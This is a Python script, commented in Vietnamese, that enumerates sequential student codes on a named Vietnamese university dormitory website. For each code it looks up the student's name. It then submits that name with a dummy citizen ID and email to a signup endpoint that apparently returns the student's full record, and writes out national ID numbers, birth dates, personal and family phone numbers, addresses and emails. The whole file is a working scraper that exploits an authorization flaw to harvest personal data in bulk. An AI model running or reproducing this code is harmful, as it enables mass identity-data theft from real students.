import requests
from bs4 import BeautifulSoup
import json
import os
from time import sleep
import re

# Initialize variables
khoa_lop = input("Nhập khóa và lớp (e.g., 23NS): ")
consecutive_failures = 0
max_consecutive_failures = 5
max_retries = 3
all_info_initialized = False  # Track if all_info.txt header is written
normalized = re.sub(r'\s+|\.', '', khoa_lop.strip().upper())
match = re.match(r'^(\d{2})([A-Z]+)$', normalized)
if not match:
    print("❌ Sai định dạng lớp. Vui lòng nhập đúng (ví dụ: 23NS, 23 IT.B, ...)")
    exit(1)
# Create base data directory
khoa, lop = match.groups()
base_dir = os.path.join("data", khoa, lop)
os.makedirs(base_dir, exist_ok=True)

# POST URL
post_url = 'https://kytucxa.vku.udn.vn/home/register/find-student-signup'

# Path for all_info.txt
all_info_path = os.path.join(base_dir, "all_info.txt")

# Process each student
for i in range(1, 999):
    kq = khoa_lop + str(i).zfill(3)
    print(f"\nProcessing student code: {kq}")

    # GET request to fetch student info
    retry_count = 0
    student_info = None

    while retry_count < max_retries:
        try:
            r = requests.get(f'https://kytucxa.vku.udn.vn/home/info/find-student?code={kq}', timeout=10)
            r.raise_for_status()
            html_doc = r.text
            soup = BeautifulSoup(html_doc, 'html.parser')
            raw_data = soup.p.text

            student_info = {}
            for line in raw_data.strip().split('\n'):
                key, value = line.split(": ", 1)
                student_info[key.strip()] = value.strip()

            json_data = json.loads(json.dumps(student_info, ensure_ascii=False))
            print(f"Họ và tên: {json_data['Họ và tên']}")
            break

        except (requests.RequestException, ValueError, AttributeError) as e:
            retry_count += 1
            print(f"GET Error for {kq} (Attempt {retry_count}/{max_retries}): {e}")
            if retry_count == max_retries:
                print(f"Skipping student {kq} after {max_retries} failed GET attempts")
                consecutive_failures += 1
                if consecutive_failures >= max_consecutive_failures:
                    print(f"❌ Stopping script after {max_consecutive_failures} consecutive failures")
                    exit(1)
                student_info = None
                break
            sleep(1)

    # If GET request failed, skip to next student
    if student_info is None:
        continue
    else:
        consecutive_failures = 0  # Reset consecutive failures on success

    # Clean double spaces in Họ và tên for POST request and output
    cleaned_fullname = re.sub(r'\s+', ' ', json_data['Họ và tên']).strip()

    # POST request with student info
    data = {
        'code': json_data['Mã sinh viên'],
        'fullname': cleaned_fullname,  # Use cleaned name
        'citizen_id': '111111111111111',
        'email': 'a@a.c'
    }

    retry_count = 0
    while retry_count < max_retries:
        try:
            response = requests.post(post_url, data=data, timeout=10)
            response.raise_for_status()
            html_doc = response.text
            soup = BeautifulSoup(html_doc, 'html.parser')

            # Extract data from input fields
            raw_data = {
                'student_id': soup.find('input', {'id': 'student_id'})['value'] if soup.find('input', {'id': 'student_id'}) else '',
                'MaSinhVien': soup.find('input', {'id': 'MaSinhVien'})['value'] if soup.find('input', {'id': 'MaSinhVien'}) else '',
                'HoDem': soup.find('input', {'id': 'HoDem'})['value'] if soup.find('input', {'id': 'HoDem'}) else '',
                'Ten': soup.find('input', {'id': 'Ten'})['value'] if soup.find('input', {'id': 'Ten'}) else '',
                'NgaySinh': soup.find('input', {'id': 'NgaySinh'})['value'] if soup.find('input', {'id': 'NgaySinh'}) else '',
                'Lop': soup.find('input', {'id': 'Lop'})['value'] if soup.find('input', {'id': 'Lop'}) else '',
                'KhoaHoc': soup.find('input', {'id': 'KhoaHoc'})['value'] if soup.find('input', {'id': 'KhoaHoc'}) else '',
                'Khoa': soup.find('input', {'id': 'Khoa'})['value'] if soup.find('input', {'id': 'Khoa'}) else '',
                'Nganh': soup.find('input', {'id': 'Nganh'})['value'] if soup.find('input', {'id': 'Nganh'}) else '',
                'Truong': soup.find('input', {'id': 'Truong'})['value'] if soup.find('input', {'id': 'Truong'}) else '',
                'SoCMND': soup.find('input', {'id': 'SoCMND'})['value'] if soup.find('input', {'id': 'SoCMND'}) else '',
                'NgayCap': soup.find('input', {'id': 'NgayCap'})['value'] if soup.find('input', {'id': 'NgayCap'}) else '',
                'NoiCap': soup.find('input', {'id': 'NoiCap'})['value'] if soup.find('input', {'id': 'NoiCap'}) else '',
                'SDTCaNhan': soup.find('input', {'id': 'SDTCaNhan'})['value'] if soup.find('input', {'id': 'SDTCaNhan'}) else '',
                'SDTGiaDinh': soup.find('input', {'id': 'SDTGiaDinh'})['value'] if soup.find('input', {'id': 'SDTGiaDinh'}) else '',
                'Email': soup.find('input', {'id': 'Email'})['value'] if soup.find('input', {'id': 'Email'}) else '',
                'HoKhau': soup.find('input', {'id': 'HoKhau'})['value'] if soup.find('input', {'id': 'HoKhau'}) else '',
                'DiaChi': soup.find('input', {'id': 'DiaChi'})['value'] if soup.find('input', {'id': 'DiaChi'}) else '',
                'TinhThanhPho': soup.find('input', {'id': 'TinhThanhPho'})['value'] if soup.find('input', {'id': 'TinhThanhPho'}) else '',
            }

            # Extract Giới tính (Nam/Nữ)
            gioi_tinh_input = soup.find('input', {'name': 'GioiTinh', 'checked': 'checked'})
            raw_data['GioiTinh'] = 'Nữ' if gioi_tinh_input and gioi_tinh_input['value'] == '0' else 'Nam'

            # Write to all_info.txt if SoCMND exists
            if raw_data['SoCMND']:
                with open(all_info_path, 'a', encoding='utf-8') as f:
                    if not all_info_initialized:
                        f.write(f"Danh sách Mã sinh viên và Số CMND ({khoa_lop}):\n")
                        f.write("'-----------------------------------'\n")
                        all_info_initialized = True
                    # New format: Mã sinh viên: MaSinhVien: Số CMND: SoCMND: Họ và tên: cleaned_fullname
                    f.write(f"Mã sinh viên: {raw_data['MaSinhVien']}: Số CMND: {raw_data['SoCMND']}: Họ và tên: {cleaned_fullname}\n")
                print(f"Appended to {all_info_path}: Mã sinh viên: {raw_data['MaSinhVien']}: Số CMND: {raw_data['SoCMND']}: Họ và tên: {cleaned_fullname}")

            # Create student directory using cleaned name
            student_dir = os.path.join(base_dir, cleaned_fullname)
            os.makedirs(student_dir, exist_ok=True)

            # Write info to txt
            with open(os.path.join(student_dir, "info.txt"), 'w', encoding='utf-8') as f:
                f.write(f"Student ID: {raw_data['student_id']}\n")
                f.write(f"Mã sinh viên: {raw_data['MaSinhVien']}\n")
                f.write(f"Họ và tên: {raw_data['HoDem']} {raw_data['Ten']}\n")
                f.write(f"Ngày sinh: {raw_data['NgaySinh']}\n")
                f.write(f"Giới tính: {raw_data['GioiTinh']}\n")
                f.write(f"Lớp: {raw_data['Lop']}\n")
                f.write(f"Khóa học: {raw_data['KhoaHoc']}\n")
                f.write(f"Khoa: {raw_data['Khoa']}\n")
                f.write(f"Ngành: {raw_data['Nganh']}\n")
                f.write(f"Trường: {raw_data['Truong']}\n")
                f.write(f"Số CCCD: {raw_data['SoCMND']}\n")
                f.write(f"Ngày cấp: {raw_data['NgayCap']}\n")
                f.write(f"Nơi cấp: {raw_data['NoiCap']}\n")
                f.write(f"Số điện thoại cá nhân: {raw_data['SDTCaNhan']}\n")
                f.write(f"Số điện thoại gia đình: {raw_data['SDTGiaDinh']}\n")
                f.write(f"Email: {raw_data['Email']}\n")
                f.write(f"Hộ khẩu thường trú: {raw_data['HoKhau']}\n")
                f.write(f"Địa chỉ liên lạc: {raw_data['DiaChi']}\n")
                f.write(f"Tỉnh/Thành phố: {raw_data['TinhThanhPho']}\n")
                f.write("'-----------------------------------'\n")

            # Save HTML content
            with open(os.path.join(student_dir, "response.html"), 'w', encoding='utf-8') as f:
                f.write(html_doc)

            # Print results
            print(f"Student ID: {raw_data['student_id']}")
            print(f"Mã sinh viên: {raw_data['MaSinhVien']}")
            print(f"Họ và tên: {raw_data['HoDem']} {raw_data['Ten']}")
            print(f"Ngày sinh: {raw_data['NgaySinh']}")
            print(f"Giới tính: {raw_data['GioiTinh']}")
            print(f"Lớp: {raw_data['Lop']}")
            print(f"Khóa học: {raw_data['KhoaHoc']}")
            print(f"Khoa: {raw_data['Khoa']}")
            print(f"Ngành: {raw_data['Nganh']}")
            print(f"Trường: {raw_data['Truong']}")
            print(f"Số CCCD: {raw_data['SoCMND']}")
            print(f"Ngày cấp: {raw_data['NgayCap']}")
            print(f"Nơi cấp: {raw_data['NoiCap']}")
            print(f"Số điện thoại cá nhân: {raw_data['SDTCaNhan']}")
            print(f"Số điện thoại gia đình: {raw_data['SDTGiaDinh']}")
            print(f"Email: {raw_data['Email']}")
            print(f"Hộ khẩu thường trú: {raw_data['HoKhau']}")
            print(f"Địa chỉ liên lạc: {raw_data['DiaChi']}")
            print(f"Tỉnh/Thành phố: {raw_data['TinhThanhPho']}")
            print('-----------------------------------')
            consecutive_failures = 0  # Reset consecutive failures
            break

        except (requests.RequestException, AttributeError, KeyError) as e:
            retry_count += 1
            print(f"POST Error for {kq} (Attempt {retry_count}/{max_retries}): {e}")
            if retry_count == max_retries:
                print(f"Skipping student {kq} after {max_retries} failed POST attempts")
                consecutive_failures += 1
                if consecutive_failures >= max_consecutive_failures:
                    print(f"❌ Stopping script after {max_consecutive_failures} consecutive failures")
                    exit(1)
                break
            sleep(1)

# Final check for all_info.txt
if os.path.exists(all_info_path):
    with open(all_info_path, 'r', encoding='utf-8') as f:
        lines = f.readlines()
        entry_count = len([line for line in lines if line.strip() and not line.startswith(('Danh sách', "'----"))])
    print(f"Completed: {all_info_path} contains {entry_count} entries")
else:
    print(f"Completed: No entries written to {all_info_path} (no valid Số CMND found)")

print("Processing completed.")